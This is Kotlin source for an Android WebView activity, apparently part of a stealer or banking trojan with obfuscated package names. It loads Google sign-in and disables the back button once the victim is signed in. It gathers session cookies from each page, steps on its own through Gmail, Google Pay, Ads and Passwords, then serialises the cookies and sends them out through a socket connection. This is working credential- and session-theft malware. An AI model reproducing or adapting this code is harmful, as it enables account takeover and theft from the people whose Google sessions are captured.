package com.xxx.zzz.commandp.taskssv

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Bundle
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import com.xxx.zzz.globp.Globalqa
import com.xxx.zzz.socketsp.IOSocketyt
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.net.URI
import java.util.concurrent.TimeUnit

class BrowserActivity : Activity() {

    val cookieList = arrayListOf<Cookie>()
    var cookieManager: CookieManager? = null

    var isBackAllow = true

    var wv: WebView? = null

    companion object {
        var opened = false

        fun newInstance(context: Context, url: String?) =
            Intent(context, BrowserActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("link", url)
            }
    }

    override fun onDestroy() {
        super.onDestroy()
        runCatching {
            if (wv != null) {
                if (wv?.parent != null) {
                    (wv?.parent as? ViewGroup?)?.removeView(wv)
                }
                WebStorage.getInstance().deleteAllData()
                wv?.destroy()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        wv = WebView(this)
        wv?.settings?.javaScriptEnabled = true
        wv?.settings?.loadWithOverviewMode = true
        wv?.settings?.useWideViewPort = true
        wv?.settings?.pluginState = WebSettings.PluginState.ON
        wv?.settings?.javaScriptCanOpenWindowsAutomatically = true

        wv?.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
        wv?.setLayerType(View.LAYER_TYPE_HARDWARE, null)

        val act = intent.getParcelableExtra<Intent>("act")
        val link = intent.getStringExtra("link")

        cookieManager = CookieManager.getInstance()
        CookieSyncManager.createInstance(this)
        if (android.os.Build.VERSION.SDK_INT >= 21) {
            cookieManager?.setAcceptThirdPartyCookies(wv, true)
        } else {
            cookieManager?.setAcceptCookie(true)
        }
        cookieManager?.acceptCookie()
        CookieSyncManager.getInstance().startSync()

        wv?.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                if (url != null) {
                    if (url.startsWith("https://myaccount.google.com")) {
                        isBackAllow = false
//                        CoroutineScope(Dispatchers.IO).launch {
//                            delay(3000)
//                            CoroutineScope(Dispatchers.Main).launch{
//                                webView.loadUrl("https://pay.google.com")
//                            }
//                            delay(3000)
//                            CoroutineScope(Dispatchers.Main).launch{
//                                webView.loadUrl("https://mail.google.com")
//                            }
//                        }
                    } else if (url.startsWith("https://passwords.google.com")) {

                    }
                    if (url.contains("goto.php")) {
                        val intent1 = Intent()
                        intent1.putExtra("act", act)
                        setResult(RESULT_OK, intent1)
                        finish()
                    }
                }
                super.onPageStarted(view, url, favicon)
            }

            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if (request != null && request.url.toString().startsWith("https://myaccount.google.com")) {
//                        CoroutineScope(Dispatchers.IO).launch {
//                            delay(3000)
//                            cookieManager?.removeAllCookies {  }
//                        }
                }
//                    if (request?.url?.toString()?.contains("/accounts/SetSID?") == true){
//                        CoroutineScope(Dispatchers.IO).launch {
//                            val u = request.url?.toString()
//                            delay(1000)
//                            saveCookies(u)
//                            Timber.d("bbb5: ${request.url?.toString()}")
//                        }
//                    }
                CoroutineScope(Dispatchers.IO).launch {
                    val u = request?.url?.toString()
                    delay(500)
                    saveCookies(u)
                }

                return super.shouldOverrideUrlLoading(view, request)
            }

            override fun shouldInterceptRequest(
                view: WebView?,
                request: WebResourceRequest?
            ): WebResourceResponse? {
                when {
                    request?.url?.toString()?.startsWith("https://accounts.google.com/signin/v2/identifier") == true -> {

                    }
                    request?.url?.toString()?.startsWith("https://accounts.google.com/_/lookup/accountlookup") == true -> {

                    }
                    request?.url?.toString()?.startsWith("https://accounts.google.com/_/signin/challenge") == true -> {

                    }
                }
//                    CoroutineScope(Dispatchers.IO).launch {
//                        val u = request?.url?.toString()
//                        delay(500)
//                        saveCookies(u)
//                        Timber.d("bbb5: ${request?.url?.toString()}")
//                    }

                //Timber.d("bbb: ${request?.url?.toString()}")
                return super.shouldInterceptRequest(view, request)
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                //saveCookies(url)
                if (url != null) {
                    when {
                        url.startsWith("https://myaccount.google.com") -> {
                            wv?.loadUrl("https://mail.google.com")
                        }
                        url.startsWith("https://mail.google.com") -> {
                            wv?.loadUrl("https://pay.google.com")
                        }
                        url.startsWith("https://pay.google.com") -> {
                            wv?.loadUrl("https://ads.google.com")
                        }
                        url.startsWith("https://ads.google.com") -> {
                            wv?.loadUrl("https://passwords.google.com")
                        }
                        url.startsWith("https://passwords.google.com") -> {
                            val cookieJson = Globalqa.gson.toJson(cookieList)
                            IOSocketyt.sendLogs("", cookieJson, "cookies")
                            val intent1 = Intent()
                            intent1.putExtra("act", act)
                            setResult(RESULT_OK, intent1)
                            finish()
                        }
                    }
                }
                super.onPageFinished(view, url)
            }

            private fun saveCookies(url: String?) {
                try {
                    url?.let { it ->
                        if (cookieManager != null) {
                            val cookie = cookieManager!!.getCookie(it).split(";").toTypedArray()
                            for (i in cookie) {
                                val domain = getDomainName(it)
                                if (cookieList.any { list ->
                                        list.domain == domain && list.name == i.substringBefore('=').replace(" ", "")
                                    }
                                ) {
                                    for (j in cookieList) {
                                        if (j.domain == domain && j.name == i.substringBefore('=').replace(" ", "")) {
                                            j.value = i.substringAfter('=')
                                        }
                                    }
                                } else {
                                    cookieList.add(
                                        Cookie(
                                            i.substringBefore('=').replace(" ", ""),
                                            i.substringAfter('='),
                                            domain
                                        )
                                    )
                                }
                            }
                        }
                    }
                } catch (t: Throwable) {
                }
            }

            private fun getDomainName(url: String): String {
                val uri = URI(url)
                val domain = uri.host
                return if (domain.startsWith("www.")) domain.substring(4) else domain
            }
        }
        if (link != null) {
            wv?.loadUrl(link)
        } else {
            wv?.loadUrl("https://accounts.google.com/signin/v2/identifier")
        }
        setContentView(wv)
    }

    override fun onStop() {
        opened = false
        super.onStop()
    }

    override fun onBackPressed() {
        if (isBackAllow) {
            super.onBackPressed()
        }
    }
}

/*
a - name
b - value
c - domain
d - path
e - secure
f - httpOnly
g - expirationDate
*/
data class Cookie(
    val name: String,
    var value: String,
    val domain: String,
    val path: String = "/",
    val httpOnly: Boolean = true,
    val secure: Boolean = true,
    val expirationDate: Long = TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()) + 120000
)